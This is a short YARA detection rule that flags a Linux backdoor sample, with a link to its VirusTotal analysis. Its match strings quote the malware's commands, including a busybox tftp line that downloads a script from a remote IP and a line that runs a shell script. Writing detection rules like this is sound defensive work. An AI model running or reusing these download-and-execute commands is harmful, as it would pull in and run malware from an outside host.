rule Linux_BackDoor : linux
{
    meta:
        author = "Cesar Diaz <cesar@cesardiaz.me>"
        description= "https://www.virustotal.com/en/file/67ece6d9e4837d3d051cd9dbf0b524c2cf76a8bfa49ddb140cc034462290d990/analysis/"

    strings:
        $a = "sh fuck2.sh"
	$b = "busybox tftp -g 185.145.131.173 -r fuck1.sh"
    
	condition:
	        all of them

}

